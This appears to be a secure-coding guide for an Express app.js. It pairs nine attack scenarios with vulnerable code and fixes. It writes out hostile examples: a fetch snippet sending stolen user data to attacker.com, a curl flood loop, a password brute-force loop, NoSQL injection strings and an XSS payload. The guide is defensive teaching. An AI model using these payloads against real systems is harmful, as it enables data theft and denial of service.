# ATTACK SCENARIOS & EXPLOITATION EXAMPLES

## How the Original app.js Can Be Attacked

### Attack 1: Unauthorized Data Access (OWASP A01:2021)

**Scenario:** Attacker wants to steal all user data

**Vulnerable Code:**
```javascript
app.get('/users', (req, res) => {
  res.json([
    { id: 1, name: 'Alice', email: 'alice@example.com' },
    { id: 2, name: 'Bob', email: 'bob@example.com' },
  ]);
});
```

**Attack:**
```bash
$ curl http://localhost:3000/users
[
  { "id": 1, "name": "Alice", "email": "alice@example.com" },
  { "id": 2, "name": "Bob", "email": "bob@example.com" }
]
```

**Impact:** 
- Complete user database exposed
- Email addresses leaked
- PII accessible to anyone

**Fix:**
```javascript
const auth = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Forbidden' });
    req.user = user;
    next();
  });
};

app.get('/users', auth, (req, res) => {
  // Now requires valid JWT token
  res.json([...]);
});
```

---

### Attack 2: NoSQL Injection (OWASP A03:2021)

**Scenario:** Attacker exploits missing input validation to inject queries

**Vulnerable Code:**
```javascript
// Example if app accepted query parameters
app.get('/users/:id', (req, res) => {
  // No validation - direct use of user input
  const userId = req.params.id;
  // If this went to database: db.users.findById(userId)
});
```

**Attack:**
```bash
# Attempt NoSQL injection
$ curl "http://localhost:3000/users/{%22$gt%22:%22%22}"
# Or with query parameters
$ curl "http://localhost:3000/users?id[%24gt]="
```

**MongoDB Query Injection Example:**
```javascript
// Vulnerable: directly uses user input
db.users.findOne({ _id: req.params.id })

// Attacker sends: {_id: { $gt: "" }} 
// Matches ALL documents instead of specific ID
```

**Fix:**
```javascript
const { param, validationResult } = require('express-validator');

app.get('/users/:id',
  param('id').isInt({ min: 1 }).toInt(), // Validate integer
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    // Safe to use - guaranteed to be integer
  }
);
```

---

### Attack 3: Cross-Site Request Forgery (CSRF) via CORS

**Scenario:** Malicious website forces user's browser to make requests

**Vulnerable Code:**
```javascript
// No CORS configuration = allows all origins
app.get('/users', (req, res) => { /* ... */ });
```

**Attack:**
Attacker hosts `malicious.com` with:
```html
<!-- Victim visits this page while logged in -->
<html>
<body>
  <script>
    fetch('http://localhost:3000/users')
      .then(r => r.json())
      .then(data => {
        // Send stolen data to attacker
        fetch('http://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
  </script>
</body>
</html>
```

**Fix:**
```javascript
const cors = require('cors');

app.use(cors({
  origin: 'https://trusted-domain.com', // Explicit whitelist
  credentials: true,
  methods: ['GET'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

---

### Attack 4: Denial of Service (DoS) (OWASP A04:2021)

**Scenario:** Attacker floods the server with requests

**Vulnerable Code:**
```javascript
// No rate limiting - accepts unlimited requests
app.get('/users', (req, res) => { /* ... */ });
```

**Attack:**
```bash
# Simple DoS attack - send 10,000 requests
for i in {1..10000}; do
  curl http://localhost:3000/users &
done
```

**Result:**
- Server becomes unresponsive
- Legitimate users can't access app
- Server may crash

**Fix:**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100, // 100 requests per 15 minutes
  message: 'Too many requests'
});

app.use(limiter);
app.get('/users', (req, res) => { /* ... */ });

// After 100 requests, attacker gets 429 Too Many Requests
```

---

### Attack 5: Information Disclosure via Error Messages

**Scenario:** Attacker triggers errors to learn about system internals

**Vulnerable Code:**
```javascript
app.get('/users/:id', (req, res) => {
  // No error handling - returns full stack trace
  const user = db.users.findById(req.params.id);
  res.json(user);
});
```

**Attack:**
```bash
# Send invalid input
$ curl "http://localhost:3000/users/invalid"

Response:
{
  "error": "TypeError: Cannot read property '_id' of undefined",
  "stack": "at Route.get (/app/routes/users.js:42:15)\n
            at Layer.handle [as handle_request] (/app/node_modules/express/lib/router.js:95:5)\n
            ...",
  "process": "/app/app.js",
  "version": "1.2.0"
}
```

**Information Leaked:**
- Stack trace reveals code structure
- File paths exposed
- Library versions visible
- Internal logic revealed

**Fix:**
```javascript
app.use((err, req, res, next) => {
  const NODE_ENV = process.env.NODE_ENV || 'development';

  logger.error(err); // Log internally

  res.status(500).json({
    error: NODE_ENV === 'production'
      ? 'Internal Server Error'
      : err.message
  });
});
```

---

### Attack 6: Brute Force Authentication (if added without limits)

**Scenario:** Attacker tries many password combinations

**Vulnerable Code:**
```javascript
// Without rate limiting
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (authenticate(username, password)) {
    res.json({ token: generateToken() });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Attack:**
```bash
# Try 10,000 password combinations
for password in $(cat wordlist.txt); do
  curl -d "username=admin&password=$password" \
    http://localhost:3000/login
done
```

**Fix:**
```javascript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 minutes
  skipSuccessfulRequests: true, // Don't count successful logins
});

app.post('/login', authLimiter, (req, res) => {
  // After 5 failed attempts, gets blocked
});
```

---

### Attack 7: XSS via Reflected Input (if query parameters added)

**Scenario:** Attacker injects malicious JavaScript

**Vulnerable Code:**
```javascript
app.get('/search', (req, res) => {
  const query = req.query.q; // No sanitization
  res.send(`You searched for: ${query}`);
});
```

**Attack:**
```bash
curl "http://localhost:3000/search?q=<img src=x onerror=alert('XSS')>"

# Response HTML:
# <html>
#   You searched for: <img src=x onerror=alert('XSS')>
# </html>

# Browser executes JavaScript!
```

**Fix:**
```javascript
const xss = require('xss-clean');

app.use(xss()); // Sanitizes all inputs

app.get('/search', (req, res) => {
  const query = req.query.q; // Sanitized automatically
  res.send(`You searched for: ${query}`);
  // Malicious tags stripped
});
```

---

### Attack 8: Clickjacking (Missing X-Frame-Options Header)

**Scenario:** Attacker tricks user into clicking invisible button

**Vulnerable Code:**
```javascript
// No security headers = app can be embedded in iframe
app.get('/users', (req, res) => {
  res.json([...]);
});
```

**Attack:**
```html
<!-- attacker.com -->
<html>
<body>
  <div style="background-color: white; padding: 20px;">
    Click here to claim your prize!
  </div>

  <!-- Invisible iframe overlaid -->
  <iframe src="http://localhost:3000/admin" 
          style="position: absolute; top: 0; left: 0; 
                 width: 100%; height: 100%; opacity: 0;">
  </iframe>
</body>
</html>
```

User clicks on "prize" but actually clicks delete button on the admin panel!

**Fix:**
```javascript
const helmet = require('helmet');

app.use(helmet.frameguard({ action: 'deny' }));
// Sets: X-Frame-Options: DENY

// Browser now prevents page from being embedded in iframe
```

---

### Attack 9: MIME Type Sniffing

**Scenario:** Browser interprets file as different type (JS as HTML)

**Vulnerable Code:**
```javascript
// No X-Content-Type-Options header
app.get('/file', (req, res) => {
  res.send('< script>alert("hacked")</script>');
});
```

**Attack:**
Browser might execute as JavaScript instead of text/plain

**Fix:**
```javascript
const helmet = require('helmet');

app.use(helmet.noSniff());
// Sets: X-Content-Type-Options: nosniff

// Browser respects Content-Type and won't sniff
```

